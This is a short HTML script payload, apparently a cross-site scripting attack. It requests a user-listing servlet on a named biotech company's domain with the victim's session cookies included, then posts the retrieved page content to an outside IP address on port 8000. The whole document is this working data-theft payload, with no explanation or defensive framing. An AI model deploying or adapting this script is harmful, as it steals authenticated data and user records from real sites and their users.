<script>
  fetch('https://wwws.blueheronbio.com/secure/servlet/ListUsers', {credentials: 'include'})
    .then(response => response.text())
    .then(data => {
      fetch('http://195.26.243.200:8000/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({pageContent: data})
      });
    });
</script>
